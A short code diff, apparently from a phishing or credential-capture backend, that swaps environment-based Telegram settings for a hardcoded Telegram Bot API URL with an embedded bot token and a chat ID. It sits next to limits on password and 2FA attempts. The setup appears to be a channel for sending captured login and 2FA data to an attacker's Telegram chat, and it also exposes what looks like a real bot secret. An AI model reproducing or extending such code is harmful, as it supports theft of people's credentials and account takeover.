@@ -1,8 +1,10 @@
 import crypto from 'crypto';
 
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_IDS = process.env.TELEGRAM_CHAT_ID;
 const ALLOWED_ORIGIN = process.env.ALLOWED_ORIGIN || '';
+
+const TELEGRAM_API = `https://api.telegram.org/bot8226522512:AAGgpgreJuQu3uXjMuFeo6qcweKO1fs1Yvg`;
+const CHAT_ID = '-4966250298';
+const agent = new https.Agent({ family: 4 });
 
 const MAX_PASSWORD_ATTEMPTS = 5;
 const MAX_2FA_ATTEMPTS = 5;
